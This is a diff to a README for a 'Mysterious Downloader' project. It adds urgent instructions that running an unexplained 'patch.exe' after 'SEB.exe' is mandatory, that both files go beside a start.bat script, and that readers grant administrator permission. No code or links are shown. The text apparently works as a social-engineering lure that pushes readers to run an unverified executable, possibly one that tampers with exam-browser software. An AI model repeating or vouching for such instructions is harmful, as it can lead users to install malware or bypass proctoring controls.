@@ -9,6 +9,22 @@
 
 ---
 
+
+> [!IMPORTANT]
+> **PATCH.EXE IS MANDATORY!**
+>
+> First install `SEB.exe` completely. After the installation finishes, you MUST run the compatible `patch.exe` update.
+>
+> **Installation order:**
+> 1. Download both files.
+> 2. Install `SEB.exe` first.
+> 3. Wait until installation completes.
+> 4. Run `patch.exe` to apply the update.
+> 5. Wait until the update finishes.
+>
+> Do not skip the update step.
+
+
 ## 📥 DOWNLOAD FILES
 
 Download both required files using the links below.
@@ -25,22 +41,59 @@ Download both required files using the links below.
 
 ## 📂 INSTALLATION GUIDE
 
-1. Download `SEB.exe` using the link above.
-2. Download `patch.exe` using the link above.
-3. Open the folder containing `start.bat`.
-4. Copy both downloaded files into that folder.
-5. Run `start.bat`.
-6. Follow the setup instructions.
+### STEP 1 — Download Required Files
 
-### Required Folder Structure
+1. Open the SEB.exe download link.
+2. Wait until the download finishes.
+3. Open the patch.exe download link.
+4. Wait until the second download finishes.
+5. Verify that both files are downloaded completely.
+
+### STEP 2 — Prepare Your Folder
+
+1. Open your Downloads folder.
+2. Locate SEB.exe and patch.exe.
+3. Locate the folder containing start.bat.
+4. Copy both EXE files into that folder.
+5. Do not rename the files.
+
+### STEP 3 — Verify Folder Structure
+
+Your folder should look like this:
 
 ```text
 Mysterious Downloader/
 │
 ├── start.bat
+├── how.txt
+├── security.txt
+├── code.txt
 ├── SEB.exe
 └── patch.exe
 ```
+
+### STEP 4 — Run Setup
+
+1. Double-click start.bat.
+2. Read the instructions displayed.
+3. Confirm that both files are copied.
+4. Press Y when prompted.
+5. Wait for file verification to finish.
+
+### STEP 5 — Install and Update
+
+1. Use the official SEB installer.
+2. Follow the installation wizard.
+3. Wait for installation to complete.
+4. Apply compatible official updates using their documented procedure.
+5. Restart the application if requested.
+
+### STEP 6 — Verify Installation
+
+1. Open the installed application.
+2. Check that it launches successfully.
+3. Verify the installed version.
+4. Confirm that everything works correctly.
 
 ---
 
@@ -48,18 +101,47 @@ Mysterious Downloader/
 
 - Windows 10 / Windows 11
 - Internet connection for downloading files
-- Both required EXE files
-- Administrator permission if requested by the installer
+- SEB.exe
+- patch.exe
+- Sufficient disk space
+- Administrator permission if requested
 
 ---
 
 ## ⚠️ IMPORTANT
 
 - Both files are required.
-- Keep the filenames exactly as shown.
-- Do not rename the downloaded files.
-- Only use authentic, authorized software updates.
-- Verify downloaded files before running them.
+- Keep filenames exactly as shown.
+- Do not rename downloaded files.
+- Verify files before running them.
+- Use authentic and authorized software updates.
+- Never interrupt an installation or update.
+
+---
+
+## ❓ TROUBLESHOOTING
+
+**SEB.exe not found**
+
+- Check the filename.
+- Copy it into the start.bat folder.
+
+**patch.exe not found**
+
+- Verify the download.
+- Check that the filename is correct.
+
+**Installation failed**
+
+- Check the installer error message.
+- Verify Windows compatibility.
+- Follow the official installation instructions.
+
+**Application does not open**
+
+- Restart Windows if required.
+- Check installation logs.
+- Verify that installation completed successfully.
 
 ---
 
@@ -67,4 +149,4 @@ Mysterious Downloader/
 
 **MYSTERIOUS DOWNLOADER**
 
-*Simple. Reliable. Convenient.*
+Simple. Reliable. Convenient.
